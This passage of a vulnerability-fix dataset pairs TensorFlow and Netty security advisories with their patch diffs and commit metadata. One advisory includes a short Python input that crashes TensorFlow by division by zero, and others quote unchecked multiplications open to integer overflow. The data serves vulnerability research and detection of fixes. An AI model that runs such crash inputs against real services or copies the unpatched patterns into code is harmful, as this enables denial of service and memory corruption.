'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1de49725a5fc4e48f1a3b902ec3599ee99283043', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a4e401da71458d253b05e41f28637b65baf64be4'}","dataset":"osv","summary":"Integer overflow in TFLite ### Impact \nAn attacker can craft a TFLite model that would cause an integer overflow [in embedding lookup operations](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/ca6f96b62ad84207fbec580404eaa7dd7403a550\/tensorflow\/lite\/kernels\/embedding_lookup_sparse.cc#L179-L189):\n\n```cc\n  int embedding_size = 1;\n  int lookup_size = 1;\n  for (int i = 0; i < lookup_rank - 1; i++, k++) {\n    const int dim = dense_shape->data.i32[i];\n    lookup_size *= dim;\n    output_shape->data[k] = dim;\n  }\n  for (int i = 1; i < embedding_rank; i++, k++) {\n    const int dim = SizeOfDimension(value, i);\n    embedding_size *= dim;\n    output_shape->data[k] = dim;\n  } \n```\n\nBoth `embedding_size` and `lookup_size` are products of values provided by the user. Hence, a malicious user could trigger overflows in the multiplication.\n\nIn certain scenarios, this can then result in heap OOB read\/write.\n  \n### Patches\nWe have patched the issue in GitHub commits [f19be71717c497723ba0cea0379e84f061a75e01](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f19be71717c497723ba0cea0379e84f061a75e01), [1de49725a5fc4e48f1a3b902ec3599ee99283043](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1de49725a5fc4e48f1a3b902ec3599ee99283043) and [a4e401da71458d253b05e41f28637b65baf64be4](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a4e401da71458d253b05e41f28637b65baf64be4).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.","published_date":"2022-02-09","chain_len":3,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1de49725a5fc4e48f1a3b902ec3599ee99283043","commit_sha":"1de49725a5fc4e48f1a3b902ec3599ee99283043","patch":"MULTI","chain_ord":"['f19be71717c497723ba0cea0379e84f061a75e01', '1de49725a5fc4e48f1a3b902ec3599ee99283043', 'a4e401da71458d253b05e41f28637b65baf64be4']","before_first_fix_commit":"{'f435ae9dee673e83504618b77e1be8cddda73e74'}","last_fix_commit":"a4e401da71458d253b05e41f28637b65baf64be4","chain_ord_pos":2.0,"commit_datetime":"12\/21\/2021, 16:48:11","message":"[lite] Check for overflow when creating required bytes.\n\nPiperOrigin-RevId: 417629001\nChange-Id: Ia7feb3ea8e988f4fd4b3c98c1a1fed4557d99fd7","author":"Karim Nosir","comments":null,"stats":"{'additions': 16, 'deletions': 7, 'total': 23}","files":"{'tensorflow\/lite\/kernels\/embedding_lookup_sparse.cc': {'additions': 16, 'deletions': 7, 'changes': 23, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/1de49725a5fc4e48f1a3b902ec3599ee99283043\/tensorflow%2Flite%2Fkernels%2Fembedding_lookup_sparse.cc', 'patch': '@@ -72,6 +72,7 @@ limitations under the License.\\n #include \"tensorflow\/lite\/kernels\/internal\/tensor_ctypes.h\"\\n #include \"tensorflow\/lite\/kernels\/internal\/tensor_utils.h\"\\n #include \"tensorflow\/lite\/kernels\/kernel_util.h\"\\n+#include \"tensorflow\/lite\/util.h\"\\n \\n namespace tflite {\\n namespace ops {\\n@@ -175,25 +176,33 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   TfLiteIntArray* output_shape = TfLiteIntArrayCreate(output_rank);\\n   TF_LITE_ENSURE(context, output_shape != nullptr);\\n   int k = 0;\\n-  int embedding_size = 1;\\n-  int lookup_size = 1;\\n+  size_t embedding_size = 1;\\n+  size_t lookup_size = 1;\\n   for (int i = 0; i < lookup_rank - 1; i++, k++) {\\n-    const int dim = dense_shape->data.i32[i];\\n-    lookup_size *= dim;\\n+    const size_t dim = dense_shape->data.i32[i];\\n+    TF_LITE_ENSURE_MSG(\\n+        context,\\n+        MultiplyAndCheckOverflow(lookup_size, dim, &lookup_size) == kTfLiteOk,\\n+        \"Lookup size overflowed.\");\\n     output_shape->data[k] = dim;\\n   }\\n   for (int i = 1; i < embedding_rank; i++, k++) {\\n-    const int dim = SizeOfDimension(value, i);\\n-    embedding_size *= dim;\\n+    const size_t dim = SizeOfDimension(value, i);\\n+    TF_LITE_ENSURE_MSG(context,\\n+                       MultiplyAndCheckOverflow(embedding_size, dim,\\n+                                                &embedding_size) == kTfLiteOk,\\n+                       \"Embedding size overflowed.\");\\n     output_shape->data[k] = dim;\\n   }\\n   TF_LITE_ENSURE_STATUS(context->ResizeTensor(context, output, output_shape));\\n-  const int output_size = lookup_size * embedding_size;\\n+  const size_t output_size = lookup_size * embedding_size;\\n   TfLiteTensorRealloc(output_size * sizeof(float), output);\\n \\n   float* output_ptr = GetTensorData<float>(output);\\n   const float* weights_ptr = GetTensorData<float>(weights);\\n   const float* value_ptr = GetTensorData<float>(value);\\n+  \/\/ Makes sure reallocation was successful.\\n+  TF_LITE_ENSURE(context, output_ptr != nullptr);\\n \\n   std::fill_n(output_ptr, output_size, 0.0f);'}}","message_norm":"[lite] check for overflow when creating required bytes.\n\npiperorigin-revid: 417629001\nchange-id: ia7feb3ea8e988f4fd4b3c98c1a1fed4557d99fd7","language":"en","entities":"[('overflow', 'SECWORD', ''), ('417629001', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/embedding_lookup_sparse.cc'])","num_files":1.0},{"index":1344,"vuln_id":"GHSA-98p5-x8x4-c9m5","cwe_id":"{'CWE-190'}","score":8.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f19be71717c497723ba0cea0379e84f061a75e01', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1de49725a5fc4e48f1a3b902ec3599ee99283043', 'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a4e401da71458d253b05e41f28637b65baf64be4'}","dataset":"osv","summary":"Integer overflow in TFLite ### Impact \nAn attacker can craft a TFLite model that would cause an integer overflow [in embedding lookup operations](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/ca6f96b62ad84207fbec580404eaa7dd7403a550\/tensorflow\/lite\/kernels\/embedding_lookup_sparse.cc#L179-L189):\n\n```cc\n  int embedding_size = 1;\n  int lookup_size = 1;\n  for (int i = 0; i < lookup_rank - 1; i++, k++) {\n    const int dim = dense_shape->data.i32[i];\n    lookup_size *= dim;\n    output_shape->data[k] = dim;\n  }\n  for (int i = 1; i < embedding_rank; i++, k++) {\n    const int dim = SizeOfDimension(value, i);\n    embedding_size *= dim;\n    output_shape->data[k] = dim;\n  } \n```\n\nBoth `embedding_size` and `lookup_size` are products of values provided by the user. Hence, a malicious user could trigger overflows in the multiplication.\n\nIn certain scenarios, this can then result in heap OOB read\/write.\n  \n### Patches\nWe have patched the issue in GitHub commits [f19be71717c497723ba0cea0379e84f061a75e01](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f19be71717c497723ba0cea0379e84f061a75e01), [1de49725a5fc4e48f1a3b902ec3599ee99283043](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1de49725a5fc4e48f1a3b902ec3599ee99283043) and [a4e401da71458d253b05e41f28637b65baf64be4](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a4e401da71458d253b05e41f28637b65baf64be4).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.","published_date":"2022-02-09","chain_len":3,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/a4e401da71458d253b05e41f28637b65baf64be4","commit_sha":"a4e401da71458d253b05e41f28637b65baf64be4","patch":"MULTI","chain_ord":"['f19be71717c497723ba0cea0379e84f061a75e01', '1de49725a5fc4e48f1a3b902ec3599ee99283043', 'a4e401da71458d253b05e41f28637b65baf64be4']","before_first_fix_commit":"{'f435ae9dee673e83504618b77e1be8cddda73e74'}","last_fix_commit":"a4e401da71458d253b05e41f28637b65baf64be4","chain_ord_pos":3.0,"commit_datetime":"12\/21\/2021, 21:06:51","message":"Prevent segfault in `embedding_lookup_sparse.cc`\n\nPrevious fixes missed one additional case.\n\nPiperOrigin-RevId: 417676944\nChange-Id: I8ab412155cf9b1e897448a6611d209eaa7ca9e66","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'tensorflow\/lite\/kernels\/embedding_lookup_sparse.cc': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/a4e401da71458d253b05e41f28637b65baf64be4\/tensorflow%2Flite%2Fkernels%2Fembedding_lookup_sparse.cc', 'patch': '@@ -159,6 +159,7 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   TF_LITE_ENSURE_OK(context, GetInputSafe(context, node, 3, &weights));\\n   const TfLiteTensor* value;\\n   TF_LITE_ENSURE_OK(context, GetInputSafe(context, node, 4, &value));\\n+  const size_t values_size = NumElements(value);\\n \\n   const int lookup_rank = SizeOfDimension(indices, 1);\\n   const int embedding_rank = NumDimensions(value);\\n@@ -253,6 +254,11 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n     current_squares_weight += w * w;\\n     current_total_weight += w;\\n     for (int k = 0; k < embedding_size; k++) {\\n+      \/\/ only index if indices are valid\\n+      if (current_output_offset + k < 0) continue;\\n+      if (current_output_offset + k >= output_size) continue;\\n+      if (example_embedding_offset + k < 0) continue;\\n+      if (example_embedding_offset + k >= values_size) continue;\\n       output_ptr[current_output_offset + k] +=\\n           value_ptr[example_embedding_offset + k] * w;\\n     }'}}","message_norm":"prevent segfault in `embedding_lookup_sparse.cc`\n\nprevious fixes missed one additional case.\n\npiperorigin-revid: 417676944\nchange-id: i8ab412155cf9b1e897448a6611d209eaa7ca9e66","language":"en","entities":"[('prevent', 'ACTION', ''), ('segfault', 'SECWORD', ''), ('417676944', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/embedding_lookup_sparse.cc'])","num_files":1.0},{"index":1348,"vuln_id":"GHSA-9959-6p3m-wxpc","cwe_id":"{'CWE-119'}","score":0.0,"chain":"{'https:\/\/github.com\/netty\/netty\/commit\/2fa9400a59d0563a66908aba55c41e7285a04994'}","dataset":"osv","summary":"Denial of service in Netty The SslHandler in Netty before 3.9.2 allows remote attackers to cause a denial of service (infinite loop and CPU consumption) via a crafted SSLv2Hello message.","published_date":"2020-06-30","chain_len":1,"project":"https:\/\/github.com\/netty\/netty","commit_href":"https:\/\/github.com\/netty\/netty\/commit\/2fa9400a59d0563a66908aba55c41e7285a04994","commit_sha":"2fa9400a59d0563a66908aba55c41e7285a04994","patch":"SINGLE","chain_ord":"['2fa9400a59d0563a66908aba55c41e7285a04994']","before_first_fix_commit":"{'129c17aaa4ac5c611519ef480c35a12e8282b807'}","last_fix_commit":"2fa9400a59d0563a66908aba55c41e7285a04994","chain_ord_pos":1.0,"commit_datetime":"06\/10\/2014, 08:55:19","message":"Fix a bug where SslHandler does not handle SSLv2Hello correctly\n\nMotivation:\n\nWhen a SSLv2Hello message is received, SSLEngine expects the application buffer size to be more than 30KB which is larger than what SslBufferPool can provide.  SSLEngine will always return with BUFFER_OVERFLOW status, blocking the SSL session from continuing the handshake.\n\nModifications:\n\nWhen SSLEngine.getSession().getApplicationBufferSize() returns a value larger than what SslBufferPool provides, allocate a temporary heap buffer.\n\nResult:\n\nSSLv2Hello is handled correctly.","author":"Trustin Lee","comments":"{'com_1': {'author': 'normanmaurer', 'datetime': '06\/10\/2014, 10:12:19', 'body': \"shouldn't this check against remaining() ?\"}, 'com_2': {'author': 'trustin', 'datetime': '06\/10\/2014, 11:07:26', 'body': 'Not really because we always clear the buffer at the finally block below.'}}","stats":"{'additions': 15, 'deletions': 5, 'total': 20}","files":"{'src\/main\/java\/org\/jboss\/netty\/handler\/ssl\/SslHandler.java': {'additions': 15, 'deletions': 5, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/netty\/netty\/raw\/2fa9400a59d0563a66908aba55c41e7285a04994\/src%2Fmain%2Fjava%2Forg%2Fjboss%2Fnetty%2Fhandler%2Fssl%2FSslHandler.java', 'patch': '@@ -1268,8 +1268,18 @@ private ChannelBuffer unwrap(\\n                     \/\/ always contain at least one record in decode().  Therefore, if SSLEngine.unwrap() returns\\n                     \/\/ BUFFER_OVERFLOW, it is always resolved by retrying after emptying the application buffer.\\n                     for (;;) {\\n+                        final int outAppBufSize = engine.getSession().getApplicationBufferSize();\\n+                        final ByteBuffer outAppBuf;\\n+                        if (nioOutAppBuf.capacity() < outAppBufSize) {\\n+                            \/\/ SSLEngine wants a buffer larger than what the pool can provide.\\n+                            \/\/ Allocate a temporary heap buffer.\\n+                            outAppBuf = ByteBuffer.allocate(outAppBufSize);\\n+                        } else {\\n+                            outAppBuf = nioOutAppBuf;\\n+                        }\\n+\\n                         try {\\n-                            result = engine.unwrap(nioInNetBuf, nioOutAppBuf);\\n+                            result = engine.unwrap(nioInNetBuf, outAppBuf);\\n                             switch (result.getStatus()) {\\n                                 case CLOSED:\\n                                     \/\/ notify about the CLOSED state of the SSLEngine. See #137\\n@@ -1283,21 +1293,21 @@ private ChannelBuffer unwrap(\\n \\n                             break;\\n                         } finally {\\n-                            nioOutAppBuf.flip();\\n+                            outAppBuf.flip();\\n \\n                             \/\/ Sync the offset of the inbound buffer.\\n                             nettyInNetBuf.readerIndex(\\n                                     nettyInNetBufStartOffset + nioInNetBuf.position() - nioInNetBufStartOffset);\\n \\n                             \/\/ Copy the unwrapped data into a smaller buffer.\\n-                            if (nioOutAppBuf.hasRemaining()) {\\n+                            if (outAppBuf.hasRemaining()) {\\n                                 if (nettyOutAppBuf == null) {\\n                                     ChannelBufferFactory factory = ctx.getChannel().getConfig().getBufferFactory();\\n                                     nettyOutAppBuf = factory.getBuffer(initialNettyOutAppBufCapacity);\\n                                 }\\n-                                nettyOutAppBuf.writeBytes(nioOutAppBuf);\\n+                                nettyOutAppBuf.writeBytes(outAppBuf);\\n                             }\\n-                            nioOutAppBuf.clear();\\n+                            outAppBuf.clear();\\n                         }\\n                     }'}}","message_norm":"fix a bug where sslhandler does not handle sslv2hello correctly\n\nmotivation:\n\nwhen a sslv2hello message is received, sslengine expects the application buffer size to be more than 30kb which is larger than what sslbufferpool can provide.  sslengine will always return with buffer_overflow status, blocking the ssl session from continuing the handshake.\n\nmodifications:\n\nwhen sslengine.getsession().getapplicationbuffersize() returns a value larger than what sslbufferpool provides, allocate a temporary heap buffer.\n\nresult:\n\nsslv2hello is handled correctly.","language":"en","entities":"[('fix', 'ACTION', ''), ('bug', 'FLAW', ''), ('buffer_overflow', 'SECWORD', ''), ('ssl', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/org\/jboss\/netty\/handler\/ssl\/SslHandler.java'])","num_files":1.0},{"index":1354,"vuln_id":"GHSA-9c78-vcq7-7vxq","cwe_id":"{'CWE-787'}","score":8.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6c0b2b70eeee588591680f5b7d5d38175fd7cdf6'}","dataset":"osv","summary":"Out of bounds write in TFLite ### Impact \nAn attacker can craft a TFLite model that would cause a write outside of bounds of an array in TFLite. In fact, the attacker can override the linked list used by the memory allocator. This can be leveraged for an arbitrary write primitive under certain conditions.\n\n### Patches\nWe have patched the issue in GitHub commit [6c0b2b70eeee588591680f5b7d5d38175fd7cdf6](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6c0b2b70eeee588591680f5b7d5d38175fd7cdf6).\n  \nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n    \n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Wang Xuan of Qihoo 360 AIVul Team.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6c0b2b70eeee588591680f5b7d5d38175fd7cdf6","commit_sha":"6c0b2b70eeee588591680f5b7d5d38175fd7cdf6","patch":"SINGLE","chain_ord":"['6c0b2b70eeee588591680f5b7d5d38175fd7cdf6']","before_first_fix_commit":"{'1de49725a5fc4e48f1a3b902ec3599ee99283043'}","last_fix_commit":"6c0b2b70eeee588591680f5b7d5d38175fd7cdf6","chain_ord_pos":1.0,"commit_datetime":"12\/21\/2021, 16:50:37","message":"[lite] add validation check for sparse fully connected\n\nPiperOrigin-RevId: 417629354\nChange-Id: If96171c4bd4f5fdb01d6368d6deab19d1c9beca7","author":"Karim Nosir","comments":null,"stats":"{'additions': 48, 'deletions': 10, 'total': 58}","files":"{'tensorflow\/lite\/kernels\/fully_connected.cc': {'additions': 48, 'deletions': 10, 'changes': 58, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/6c0b2b70eeee588591680f5b7d5d38175fd7cdf6\/tensorflow%2Flite%2Fkernels%2Ffully_connected.cc', 'patch': '@@ -928,6 +928,36 @@ TfLiteStatus EvalShuffledQuantized(TfLiteContext* context, TfLiteNode* node,\\n   return kTfLiteOk;\\n }\\n \\n+\/\/ Verifies that sparsity values are valid given input\/weight\/output.\\n+bool VerifySparsity(const RuntimeShape& weights_shape,\\n+                    const RuntimeShape& input_shape,\\n+                    const RuntimeShape& output_shape,\\n+                    const TfLiteSparsity* sparsity) {\\n+  const int weights_dims_count = weights_shape.DimensionsCount();\\n+  const int output_dims_count = output_shape.DimensionsCount();\\n+  const int w0_size = sparsity->dim_metadata[0].dense_size;\\n+  const int accum_depth = weights_shape.Dims(weights_dims_count - 1);\\n+  const int output_elements = output_shape.FlatSize();\\n+  const int input_elements = input_shape.FlatSize();\\n+  const int batches = FlatSizeSkipDim(output_shape, output_dims_count - 1);\\n+  const int output_depth = MatchingDim(weights_shape, weights_dims_count - 2,\\n+                                       output_shape, output_dims_count - 1);\\n+  const int max_batch_index = batches - 1;\\n+  const int max_output = max_batch_index * output_depth + w0_size;\\n+  const int max_batch_depth = accum_depth * max_batch_index;\\n+\\n+  \/\/ Verify output size is enough.\\n+  if (output_elements < max_output) return false;\\n+\\n+  \/\/ Verify index from sparse in input is valid.\\n+  for (int i = 0; i < sparsity->dim_metadata[1].array_indices->size; ++i) {\\n+    if (input_elements <=\\n+        max_batch_depth + sparsity->dim_metadata[1].array_indices->data[i])\\n+      return false;\\n+  }\\n+  return true;\\n+}\\n+\\n template <KernelType kernel_type>\\n TfLiteStatus EvalFloat(TfLiteContext* context, TfLiteNode* node,\\n                        TfLiteFullyConnectedParams* params, OpData* data,\\n@@ -968,24 +998,32 @@ TfLiteStatus EvalFloat(TfLiteContext* context, TfLiteNode* node,\\n                            \"Unsupported sparse fully-connected weight format.\");\\n         return kTfLiteError;\\n       }\\n+      const auto& input_shape = GetTensorShape(input);\\n+      const auto& filter_shape = GetTensorShape(filter);\\n+      const auto& output_shape = GetTensorShape(output);\\n+      const auto& bias_shape = GetTensorShape(bias);\\n+      if (!VerifySparsity(filter_shape, input_shape, output_shape, &sparsity)) {\\n+        TF_LITE_KERNEL_LOG(context, \"Invalid sparse fully-connected format.\");\\n+        return kTfLiteError;\\n+      }\\n \\n       if (sparsity.dim_metadata_size == kDimMetadataSizeRandomSparse) {\\n         \/\/ Random sparse.\\n         optimized_ops::FullyConnectedSparseWeight(\\n-            sparsity, op_params, GetTensorShape(input),\\n-            GetTensorData<float>(input), GetTensorShape(filter),\\n-            GetTensorData<float>(filter), GetTensorShape(bias),\\n-            GetTensorData<float>(bias), GetTensorShape(output),\\n-            GetTensorData<float>(output));\\n+            sparsity, op_params,                         \/\/ Disable formatting\\n+            input_shape, GetTensorData<float>(input),    \/\/ Disable formatting\\n+            filter_shape, GetTensorData<float>(filter),  \/\/ Disable formatting\\n+            bias_shape, GetTensorData<float>(bias),      \/\/ Disable formatting\\n+            output_shape, GetTensorData<float>(output));\\n       } else if (sparsity.dim_metadata_size == kDimMetadataSizeBlockSparse &&\\n                  sparsity.dim_metadata[2].dense_size == 4) {\\n         \/\/ Block sparse with block size of 1x4.\\n         optimized_ops::FullyConnectedSparseWeight1x4(\\n-            sparsity, op_params, GetTensorShape(input),\\n-            GetTensorData<float>(input), GetTensorShape(filter),\\n-            GetTensorData<float>(filter), GetTensorShape(bias),\\n-            GetTensorData<float>(bias), GetTensorShape(output),\\n-            GetTensorData<float>(output),\\n+            sparsity, op_params,                         \/\/ Disable formatting\\n+            input_shape, GetTensorData<float>(input),    \/\/ Disable formatting\\n+            filter_shape, GetTensorData<float>(filter),  \/\/ Disable formatting\\n+            bias_shape, GetTensorData<float>(bias),      \/\/ Disable formatting\\n+            output_shape, GetTensorData<float>(output),\\n             CpuBackendContext::GetFromContext(context));\\n       } else {\\n         TF_LITE_KERNEL_LOG(context,'}}","message_norm":"[lite] add validation check for sparse fully connected\n\npiperorigin-revid: 417629354\nchange-id: if96171c4bd4f5fdb01d6368d6deab19d1c9beca7","language":"en","entities":"[('add', 'ACTION', ''), ('417629354', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/fully_connected.cc'])","num_files":1.0},{"index":1355,"vuln_id":"GHSA-9c84-4hx6-xmm4","cwe_id":"{'CWE-190'}","score":6.3,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4253f96a58486ffe84b61c0415bb234a4632ee73'}","dataset":"osv","summary":"Integer overflow in TFLite concatentation ### Impact\nThe TFLite implementation of concatenation is [vulnerable to an integer overflow issue](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/7b7352a724b690b11bfaae2cd54bc3907daf6285\/tensorflow\/lite\/kernels\/concatenation.cc#L70-L76):\n\n```cc\nfor (int d = 0; d < t0->dims->size; ++d) {\n  if (d == axis) { \n    sum_axis += t->dims->data[axis]; \n  } else {\n    TF_LITE_ENSURE_EQ(context, t->dims->data[d], t0->dims->data[d]);\n  }\n}\n```\n\nAn attacker can craft a model such that the dimensions of one of the concatenation input overflow the values of `int`. TFLite uses `int` to represent tensor dimensions, whereas TF uses `int64`. Hence, valid TF models can trigger an integer overflow when converted to TFLite format.\n\n### Patches\nWe have patched the issue in GitHub commit [4253f96a58486ffe84b61c0415bb234a4632ee73](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4253f96a58486ffe84b61c0415bb234a4632ee73).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4253f96a58486ffe84b61c0415bb234a4632ee73","commit_sha":"4253f96a58486ffe84b61c0415bb234a4632ee73","patch":"SINGLE","chain_ord":"['4253f96a58486ffe84b61c0415bb234a4632ee73']","before_first_fix_commit":"{'7b7352a724b690b11bfaae2cd54bc3907daf6285'}","last_fix_commit":"4253f96a58486ffe84b61c0415bb234a4632ee73","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 23:50:55","message":"Fix integer overflow in TFLite concat\n\nPiperOrigin-RevId: 371013841\nChange-Id: I6a4782ce7ca753e23ff31e7fb6aeb7f9d412cd29","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'tensorflow\/lite\/kernels\/concatenation.cc': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/4253f96a58486ffe84b61c0415bb234a4632ee73\/tensorflow%2Flite%2Fkernels%2Fconcatenation.cc', 'patch': '@@ -16,6 +16,8 @@ limitations under the License.\\n \\n #include <stdint.h>\\n \\n+#include <limits>\\n+\\n #include \"tensorflow\/lite\/c\/builtin_op_data.h\"\\n #include \"tensorflow\/lite\/c\/common.h\"\\n #include \"tensorflow\/lite\/kernels\/internal\/compatibility.h\"\\n@@ -69,6 +71,10 @@ TfLiteStatus Prepare(TfLiteContext* context, TfLiteNode* node) {\\n     TF_LITE_ENSURE_EQ(context, t->type, input_type);\\n     for (int d = 0; d < t0->dims->size; ++d) {\\n       if (d == axis) {\\n+        \/\/ Avoid integer overflow in sum_axis below\\n+        TF_LITE_ENSURE(context, t->dims->data[axis] >= 0);\\n+        TF_LITE_ENSURE(context, t->dims->data[axis] <=\\n+                                    std::numeric_limits<int>::max() - sum_axis);\\n         sum_axis += t->dims->data[axis];\\n       } else {\\n         TF_LITE_ENSURE_EQ(context, t->dims->data[d], t0->dims->data[d]);'}}","message_norm":"fix integer overflow in tflite concat\n\npiperorigin-revid: 371013841\nchange-id: i6a4782ce7ca753e23ff31e7fb6aeb7f9d412cd29","language":"en","entities":"[('fix', 'ACTION', ''), ('integer overflow', 'SECWORD', ''), ('371013841', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/concatenation.cc'])","num_files":1.0},{"index":1356,"vuln_id":"GHSA-9c8h-2mv3-49ww","cwe_id":"{'CWE-369'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4'}","dataset":"osv","summary":"Division by 0 in most convolution operators ### Impact\nMost implementations of convolution operators in TensorFlow are affected by a division by 0 vulnerability where an attacker can trigger a denial of service via a crash:\n\n```python\nimport tensorflow as tf\n\ntf.compat.v1.disable_v2_behavior()\ntf.raw_ops.Conv2D(\n  input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),\n  filter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),\n  strides = [1, 1, 1, 1],\n  padding = \"SAME\")\n```\n\nThe shape inference [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/core\/framework\/common_shape_fns.cc#L577) is missing several validations before doing divisions and modulo operations.\n\n### Patches\nWe have patched the issue in GitHub commit [8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4","commit_sha":"8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4","patch":"SINGLE","chain_ord":"['8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4']","before_first_fix_commit":"{'1071f554dbd09f7e101324d366eec5f4fe5a3ece'}","last_fix_commit":"8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4","chain_ord_pos":1.0,"commit_datetime":"07\/30\/2021, 01:23:45","message":"Prevent division by 0 in common shape functions.\n\nPiperOrigin-RevId: 387712197\nChange-Id: Id25c7460e35b68aeeeac23b9a88e455b443ee149","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 11, 'deletions': 0, 'total': 11}","files":"{'tensorflow\/core\/framework\/common_shape_fns.cc': {'additions': 11, 'deletions': 0, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4\/tensorflow%2Fcore%2Fframework%2Fcommon_shape_fns.cc', 'patch': '@@ -672,6 +672,8 @@ Status Conv2DShapeImpl(shape_inference::InferenceContext* c,\\n   if (c->ValueKnown(input_depth_dim) && c->ValueKnown(filter_input_depth_dim)) {\\n     int64_t input_depth_value = c->Value(input_depth_dim),\\n             filter_input_depth_value = c->Value(filter_input_depth_dim);\\n+    if 